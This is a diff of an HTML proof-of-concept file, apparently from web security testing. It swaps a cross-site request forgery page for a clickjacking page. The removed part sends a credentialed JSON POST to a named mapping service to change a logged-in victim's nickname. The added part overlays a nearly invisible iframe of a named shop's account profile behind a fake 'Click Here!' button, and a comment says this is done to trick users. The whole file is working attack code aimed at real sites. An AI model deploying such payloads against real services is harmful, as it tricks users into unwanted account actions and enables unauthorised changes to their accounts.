@@ -3,29 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF JSON POC</title>
+    <title>Clickjacking PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            position: relative;
+            width: 800px;
+            height: 600px;
+            margin: 100px auto;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.1; /* Make it barely visible to trick users */
+            z-index: 2;
+        }
+        .fake-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 50px;
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            line-height: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1; /* Fake button is above the iframe */
+        }
+    </style>
 </head>
 <body>
-    <h1>CSRF JSON POC</h1>
-    <p>If the victim is logged in and visits this page, their nickname will be changed.</p>
-    <script>
-        // Craft the JSON payload
-        const data = {
-            "showAvatar": false,
-            "type": "NICK",
-            "nickname": "csrf"
-        };
-
-        // Create and send the malicious POST request
-        fetch("https://service.mapcreator.here.com/service-mapcreator/usersettings/nickname", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Accept": "application/json"
-            },
-            body: JSON.stringify(data),
-            credentials: "include" // Include cookies to simulate victim's session
-        });
-    </script>
+    <div class="container">
+        <iframe src="https://osi.rosenberger.shop/en/account/profile"></iframe>
+        <div class="fake-button">Click Here!</div>
+    </div>
 </body>
 </html>
